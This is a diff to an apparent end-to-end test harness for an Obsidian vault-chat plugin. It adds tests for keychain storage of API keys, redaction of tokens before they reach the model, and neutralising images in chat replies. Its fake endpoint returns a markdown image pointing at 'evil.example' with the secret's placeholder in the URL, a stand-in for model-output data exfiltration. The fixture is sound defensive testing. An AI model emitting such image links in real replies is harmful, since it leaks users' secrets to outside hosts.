@@ -116,11 +116,13 @@
 import { existsSync, readFileSync, writeFileSync } from "node:fs";
 import { join } from "node:path";
 import { cwd } from "node:process";
+import { createServer, type Server } from "node:http";
 
 import { Cdp, attachTo, pollUntil, requireVisible } from "../../tools/obsidian-cdp/cdp.js";
 import { requireEigenerBuild } from "../../tools/obsidian-cdp/vault.js";
 import { capture } from "../../tools/obsidian-cdp/shot.js";
 import { EN, DE } from "../src/i18n/strings";
+import { LLM_CONNECTION_STRINGS_EN, LLM_CONNECTION_STRINGS_DE } from "../src/vendor/kit-obsidian/llm-connection-strings";
 
 const PLUGIN_ID = "vault-retrieval";
 /** Muss zu `setIcon(...)` in `buildEndpointList` passen. */
@@ -438,7 +440,18 @@ async function main(): Promise<void> {
       skippedModel: W["endpointRole.skippedModel"],
       checking: W["settings.conn.checking"],
     };
-    console.log(`  (Oberflächensprache: ${uiLang} — erwarte „${L.active}" / „${L.unreachable}")\n`);
+    // Die Chat-Liste zeichnet seit Welle 15 das Kit (`llm.renderSettings`) mit SEINEN Zustandstexten;
+    // die Embedding-Liste bleibt beim Wörterbuch des Plugins. Zwei Wortschätze, je Liste einer.
+    const KE = (uiLang.startsWith("de") ? LLM_CONNECTION_STRINGS_DE : LLM_CONNECTION_STRINGS_EN).endpointList;
+    const LK = {
+      active: KE.role({ kind: "active" }),
+      standby: KE.role({ kind: "standby", position: 98765 }).replace("98765", "{0}"),
+      unreachable: KE.role({ kind: "unreachable" }),
+      skippedModel: KE.role({ kind: "skipped-model" }),
+      checking: KE.probing,
+    };
+    const isChecking = (state: string | null): boolean => state === L.checking || state === LK.checking;
+    console.log(`  (Oberflächensprache: ${uiLang} — Embedding „${L.active}" / „${L.unreachable}", Chat (Kit) „${LK.active}" / „${LK.unreachable}")\n`);
 
     // --- 0. Plugin-API für Fremdplugins ------------------------------------
     // Der Aufruf läuft über CDP im Renderer, also exakt auf dem Weg, den ein anderes
@@ -728,7 +741,7 @@ async function main(): Promise<void> {
       let last: Row[] = [];
       for (;;) {
         last = await settings!.evaluate<Row[]>(READ_ROWS);
-        const pending = last.filter(r => r.state === L.checking).length;
+        const pending = last.filter(r => isChecking(r.state)).length;
         if (pending === 0 || Date.now() > deadline) return last;
         await new Promise(r => setTimeout(r, 750));
       }
@@ -797,8 +810,9 @@ async function main(): Promise<void> {
     // wären zwei „aktiv" ein Fehlalarm.
     for (const li of lists) {
       const inList = withState.filter(r => r.listIndex === li);
-      const activeRows = inList.filter(r => r.state === L.active);
-      const reachable = inList.filter(r => r.state !== L.unreachable && r.state !== L.checking);
+      const V = li === CHAT_LIST ? LK : L;
+      const activeRows = inList.filter(r => r.state === V.active);
+      const reachable = inList.filter(r => r.state !== V.unreachable && r.state !== V.checking);
       const name = listNames[li] ?? `Liste ${li}`;
       // Ist gar nichts erreichbar, ist „keine aktive Zeile" die ehrliche Anzeige, kein Fehler.
       const expected = reachable.length === 0 ? 0 : 1;
@@ -815,18 +829,18 @@ async function main(): Promise<void> {
     // statt 27/30). Bemerkenswert daran: dieses Repo hat vier i18n-Waechter fuer den
     // Produktcode — nur der PRUEFSTAND wurde nie gegen dieselbe Regel gehalten.
     const escape = (x: string) => x.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
-    const zustandsRegex = new RegExp("^(" + [
-      escape(L.active),
-      escape(L.standby).replace("\\{0\\}", "\\d+"),
-      escape(L.unreachable),
-      escape(L.skippedModel),
-      escape(L.checking),
+    const regexOf = (V: typeof L): RegExp => new RegExp("^(" + [
+      escape(V.active),
+      escape(V.standby).replace("\\{0\\}", "\\d+"),
+      escape(V.unreachable),
+      escape(V.skippedModel),
+      escape(V.checking),
     ].join("|") + ")$");
-    const known = zustandsRegex;
-    const unknown = withState.filter(r => !known.test(r.state ?? ""));
+    const zustandsRegex = { embedding: regexOf(L), chat: regexOf(LK) };
+    const unknown = withState.filter(r => !(r.listIndex === CHAT_LIST ? zustandsRegex.chat : zustandsRegex.embedding).test(r.state ?? ""));
     record("Alle Zustandstexte sind bekannte Formulierungen", unknown.length === 0,
       unknown.length ? unknown.map(r => `"${r.state}"`).join(", ") : `${withState.length} Zeilen geprüft`);
-    const stillProbing = withState.filter(r => r.state === L.checking);
+    const stillProbing = withState.filter(r => isChecking(r.state));
     if (stillProbing.length) {
       record("Alle Proben abgeschlossen", false, `${stillProbing.length} Zeilen noch bei „${L.checking}" — Timeout zu kurz?`);
     }
@@ -902,7 +916,7 @@ async function main(): Promise<void> {
       record("Klick setzt die Zeile an die Spitze", movedToTop,
         movedToTop ? `„${beforeUrl}" steht auf Platz 1` : `Platz 1 ist „${top?.url}"`);
       record("Die nach oben geholte Zeile meldet danach ihren Zustand",
-        !!top && top.state !== null && top.state !== L.checking,
+        !!top && top.state !== null && !isChecking(top.state),
         `„${top?.state}"`);
       record("Die nach oben geholte Zeile trägt keinen Prioritäts-Knopf mehr",
         !!top && !top.hasPriorityButton,
@@ -1026,13 +1040,15 @@ async function main(): Promise<void> {
       // Auf der NODE-Seite, nicht im Renderer: von dort scheitert `fetch` am CORS-Preflight
       // (LM Studio ohne `--cors`; das Plugin selbst geht ueber `requestUrl`/XHR, die kein CORS
       // kennen), der erste Anlauf meldete „Failed to fetch" nach 2 s und waermte nichts.
-      // Den Endpunkt nehmen, den das Plugin WIRKLICH benutzt (`chatEndpointInUse`), nicht
+      // Den Endpunkt nehmen, den das Plugin WIRKLICH benutzt (`llm.resolve()`), nicht
       // `chatEndpoints[0]`: der Klick-Pruefpunkt weiter oben hat die Liste umsortiert (den toten
       // Endpunkt an Platz 1), und zurueckgeschrieben wird erst im finally — der Warmup traf so
       // zweimal ECONNREFUSED, waehrend der Chat danach ueber den aktiven Endpunkt lief.
       const warmEp = await main.evaluate<{ url: string; model: string; apiKey?: string } | null>(`
         const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
-        const ep = (p.chatEndpointInUse && p.chatEndpointInUse.url) ? p.chatEndpointInUse : (p.settings.chatEndpoints || [])[0];
+        const used = (await p.llm.resolve()).config;
+        // chatEndpoints[0] traegt seit dem Schluesselbund keinen apiKey mehr: der Schluessel kommt aus der Aufloesung.
+        const ep = (used && used.url) ? used : (p.settings.chatEndpoints || [])[0];
         return ep ? { url: ep.url, model: ep.model || "", apiKey: ep.apiKey } : null;
       `);
       const warmStart = Date.now();
@@ -1525,7 +1541,7 @@ async function main(): Promise<void> {
           await p.resolveAndReconnectChat();
           await p.resolveAndReconnectEmbedder();
           return {
-            key: p.chatEndpointInUse.apiKey, model: p.chatModelInUse, active: p.activeChatEndpoint,
+            key: ((await p.llm.resolve()).config || {}).apiKey, model: p.chatModelInUse, active: p.activeChatEndpoint,
             calls: window.__vrMgrCalls.join(","),
             embModel: p.embeddingModelInUse, embActive: p.activeEmbeddingEndpoint,
           };
@@ -1583,11 +1599,130 @@ async function main(): Promise<void> {
         const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
         await p.resolveAndReconnectChat();
         await p.resolveAndReconnectEmbedder();
-        return { model: p.chatModelInUse, key: p.chatEndpointInUse.apiKey || "", emb: p.embeddingModelInUse };
+        return { model: p.chatModelInUse, key: ((await p.llm.resolve()).config || {}).apiKey || "", emb: p.embeddingModelInUse };
       `);
       record(MGR_PUNKTE[4]!,
         m5.model === mgrLocal.chatModel && m5.key !== "w8-schluessel" && m5.emb !== MGR_EMB_MODEL,
         `Chat-Modell ${String(m5.model)} · Embedding-Modell ${String(m5.emb)}`);
+    }
+
+
+    // --- 7e2. Verbindungs-Tausch (Welle 15): Schlüsselbund, Neustarts, Schwärzung ---------------
+    // Gegen einen FAKE-Endpunkt auf der Node-Seite: er zeichnet Body und Header auf und spiegelt
+    // den Platzhalter, den er im gesendeten Text findet, in seine Antwort (wie ein Modell, das die
+    // Stelle zitiert). CORS-Kopfzeilen und Preflight, weil das Plugin per XHR aus app://obsidian.md
+    // fragt. Die Chat-Liste wird für den Block auf diesen Endpunkt gestellt und im finally
+    // zurückgeschrieben.
+    const W15_PUNKTE = [
+      "Schlüsselbund: nach dem ersten Auflösen steht kein apiKey mehr in data.json, die Zeile trägt secretId",
+      "Schlüsselbund: nach ZWEI Neustarts (Plugin neu geladen) trägt die Zeile weiter secretId und der Schlüssel löst auf",
+      "Schlüsselbund: der Bearer erreicht den Endpunkt",
+      "Schwärzung: das Modell sieht einen Platzhalter statt des Tokens, der Aufrufer bekommt das Original zurück",
+      "Neutralisierung: eine Antwort mit Bild-URL und Platzhalter erzeugt in der Chat-Oberfläche kein img-Element",
+    ];
+    {
+      const W15_KEY = "w15-schluessel-geheim";
+      const W15_TOKEN = "Bearer abcdefghijklmnopqrstuvwxyz0123456789";
+      const seen: { auth: string | undefined; body: string }[] = [];
+      let mode: "plain" | "image" = "plain";
+      const srv: Server = createServer((req, res) => {
+        const cors = { "Access-Control-Allow-Origin": "*", "Access-Control-Allow-Headers": "authorization, content-type", "Access-Control-Allow-Methods": "GET, POST, OPTIONS" };
+        if (req.method === "OPTIONS") { res.writeHead(204, cors); res.end(); return; }
+        if (req.method === "GET") { res.writeHead(200, { ...cors, "Content-Type": "application/json" }); res.end(JSON.stringify({ data: [{ id: "fake-model" }] })); return; }
+        let body = "";
+        req.on("data", (c: Buffer) => { body += c.toString(); });
+        req.on("end", () => {
+          seen.push({ auth: req.headers.authorization, body });
+          const ph = /\[redacted-[a-z0-9-]+-\d+\]/.exec(body)?.[0] ?? "KEIN-PLATZHALTER";
+          const text = mode === "image" ? `Siehe ![x](https://evil.example/?d=${ph}) hier` : `Zitat: ${ph} gewesen`;
+          res.writeHead(200, { ...cors, "Content-Type": "text/event-stream" });
+          res.end(`data: ${JSON.stringify({ choices: [{ delta: { content: text }, finish_reason: "stop" }] })}\n\ndata: [DONE]\n\n`);
+        });
+      });
+      await new Promise<void>((r) => srv.listen(0, "127.0.0.1", r));
+      const addr = srv.address();
+      const url = `http://127.0.0.1:${typeof addr === "object" && addr ? addr.port : 0}`;
+      const saved = await main.evaluate<unknown>(`return JSON.parse(JSON.stringify(app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}].settings.chatEndpoints));`);
+      try {
+        const n1 = await main.evaluate<Record<string, unknown>>(`
+          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+          p.settings.chatEndpoints = [{ url: ${JSON.stringify(url)}, model: "fake-model", apiKey: ${JSON.stringify(W15_KEY)} }];
+          p.llm.invalidate();
+          const r = await p.llm.resolve({ force: true });
+          await new Promise(res => setTimeout(res, 300));
+          await p.saveSettings();
+          const disk = await app.vault.adapter.read(app.vault.configDir + "/plugins/" + ${JSON.stringify(PLUGIN_ID)} + "/data.json");
+          const row = JSON.parse(disk).chatEndpoints[0] || {};
+          return { leak: disk.includes(${JSON.stringify(W15_KEY)}), secretId: row.secretId || null, id: row.id || null, resolvedKey: (r.config || {}).apiKey || null };
+        `);
+        record(W15_PUNKTE[0]!, n1.leak === false && !!n1.secretId && n1.resolvedKey === W15_KEY,
+          `leak=${String(n1.leak)} · secretId=${String(n1.secretId)} · aufgelöster Schlüssel ${n1.resolvedKey === W15_KEY ? "stimmt" : String(n1.resolvedKey)}`);
+
+        const neustarts: string[] = [];
+        let ok2 = true;
+        for (let i = 1; i <= 2; i++) {
+          const r = await main.evaluate<Record<string, unknown>>(`
+            await app.plugins.disablePlugin(${JSON.stringify(PLUGIN_ID)});
+            await app.plugins.enablePlugin(${JSON.stringify(PLUGIN_ID)});
+            await new Promise(res => setTimeout(res, 800));
+            const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+            const row = p.settings.chatEndpoints[0] || {};
+            const cfg = (await p.llm.resolve({ force: true })).config || {};
+            return { secretId: row.secretId || null, plain: row.apiKey || null, key: cfg.apiKey || null };
+          `);
+          const good = !!r.secretId && !r.plain && r.key === W15_KEY;
+          ok2 = ok2 && good;
+          neustarts.push(`Neustart ${i}: secretId ${r.secretId ? "da" : "WEG"} · Schlüssel ${r.key === W15_KEY ? "löst auf" : "FEHLT"}`);
+        }
+        record(W15_PUNKTE[1]!, ok2, neustarts.join(" · "));
+
+        const n3 = await main.evaluate<Record<string, unknown>>(`
+          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+          const r = await p.chatClient.stream([{ role: "user", content: "Der Zugang ist ${W15_TOKEN} ok." }], () => {}, () => {});
+          return { content: r.content };
+        `);
+        const first = seen[seen.length - 1];
+        record(W15_PUNKTE[2]!, first?.auth === `Bearer ${W15_KEY}`, `Authorization: ${first?.auth === `Bearer ${W15_KEY}` ? "Bearer <Schlüssel aus dem Schlüsselbund>" : String(first?.auth)}`);
+        record(W15_PUNKTE[3]!,
+          !!first && !first.body.includes("abcdefghijklmnopqrstuvwxyz0123456789") && /\[redacted-/.test(first.body)
+            && String(n3.content).includes("abcdefghijklmnopqrstuvwxyz0123456789"),
+          `Body ${first && !first.body.includes("abcdefghijklmnopqrstuvwxyz") ? "ohne Token" : "TRÄGT DAS TOKEN"} · Ergebnis ${String(n3.content).includes("abcdefghijklmnopqrstuvwxyz") ? "mit Original" : "OHNE Original"}`);
+
+        // Bild-URL mit Platzhalter: über die echte Chat-Oberfläche, denn dort entscheidet sich, ob
+        // aus der restaurierten Antwort ein Element wird, das das Geheimnis ohne Klick verschickt.
+        mode = "image";
+        await main.evaluate(`
+          await app.commands.executeCommandById("vault-retrieval:open-vault-chat");
+          await new Promise(r => setTimeout(r, 800));
+          const ta = document.querySelector(".vault-rag-chat-input");
+          ta.value = "Zeig mir ${W15_TOKEN} als Bild";
+          ta.dispatchEvent(new Event("input", { bubbles: true }));
+          await new Promise(r => setTimeout(r, 700));
+          document.querySelector(".vault-rag-chat-send").click();
+        `);
+        const fertig = await pollUntil(main,
+          `const w = document.querySelector(".vault-rag-chat-working"); return !!w && /✓/.test(w.textContent || "");`,
+          60_000, 500).catch(() => false);
+        const img = await main.evaluate<{ imgs: number; hasText: boolean }>(`
+          // Gezählt wird, was das Geheimnis verschicken könnte: ein img mit der fremden Adresse. Das
+          // Chat-Panel trägt andere img (Notiz-Vorschauen) nicht, die Sidebar aber Icons und Avatare.
+          const root = document.querySelector(".vault-rag-chat-root") || document.body;
+          return { imgs: root.querySelectorAll('img[src*="evil.example"], img[src*="redacted"]').length, hasText: (root.textContent || "").includes("evil.example") };
+        `);
+        record(W15_PUNKTE[4]!, fertig === true && img.imgs === 0 && img.hasText,
+          fertig ? `${img.imgs} img-Element(e) · Antworttext ${img.hasText ? "sichtbar als Text" : "FEHLT"}` : "keine Ergebniszeile in 60 s — nichts gemessen");
+      } finally {
+        await main.evaluate(`
+          const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
+          const cur = p.settings.chatEndpoints[0];
+          if (cur && cur.secretId) app.secretStorage.setSecret(cur.secretId, "");
+          p.settings.chatEndpoints = ${JSON.stringify(saved)};
+          await p.saveSettings();
+          p.llm.invalidate();
+          await p.resolveAndReconnectChat();
+        `);
+        await new Promise<void>((r) => srv.close(() => r()));
+      }
     }
 
 
@@ -1845,7 +1980,10 @@ async function main(): Promise<void> {
         reformat: "Gesendeter Body: Umformatieren (transform) trägt die Modus-Temperatur 0,2 und ein Budget",
         smart: "Gesendeter Body: Smart Apply (structured) trägt die Modus-Temperatur 0,1 und das Plugin-Budget",
       };
-      const title = W["request.title"] ?? "";
+      // Der Abschnitt „Anfrage“ kommt seit Welle 15 vom Kit (`llm.renderSettings`): Titel, Kopfzeile und
+      // Modus-Überschriften stammen aus SEINEM Wortschatz in der Sprache der Oberfläche.
+      const KR = (uiLang.startsWith("de") ? LLM_CONNECTION_STRINGS_DE : LLM_CONNECTION_STRINGS_EN).request;
+      const title = KR.title;
       let st: Cdp | null = null;
       try {
         await requireVisible(main);
@@ -1866,8 +2004,8 @@ async function main(): Promise<void> {
           return true;
         `);
         const n1 = await readSection();
-        const headPrefix = (W["request.head"] ?? "").split("{0}")[0] ?? "";
-        const modeNames = ["grounded", "structured", "transform"].map((m) => (W as Record<string, string | undefined>)[`request.mode.${m}`] ?? m);
+        const headPrefix = KR.head("\u0001", "", "", "").split("\u0001")[0] ?? "";
+        const modeNames = (["grounded", "structured", "transform"] as const).map((m) => KR.modeHeading(m));
         record(W7I.n1, n1.found && n1.open && n1.text.includes(headPrefix) && modeNames.every((m) => n1.text.includes(m)),
           `gefunden: ${n1.found} · offen: ${n1.open} · Kopfzeile: ${n1.text.includes(headPrefix)} · Modi: ${modeNames.filter((m) => n1.text.includes(m)).join(", ")}`);
 
@@ -1883,7 +2021,7 @@ async function main(): Promise<void> {
         `);
         const afterSet = await main.evaluate<{ overrides: unknown; family: string | null }>(`
           const p = app.plugins.plugins[${JSON.stringify(PLUGIN_ID)}];
-          return { overrides: p.settings.request.overrides.grounded ?? null, family: p.requestSectionState().family };
+          return { overrides: p.settings.request.overrides.grounded ?? null, family: p.llm.source().family };
         `);
         const n2a = await readSection();
         const gesetzt = JSON.stringify(afterSet.overrides).includes('"temperature":0.9');
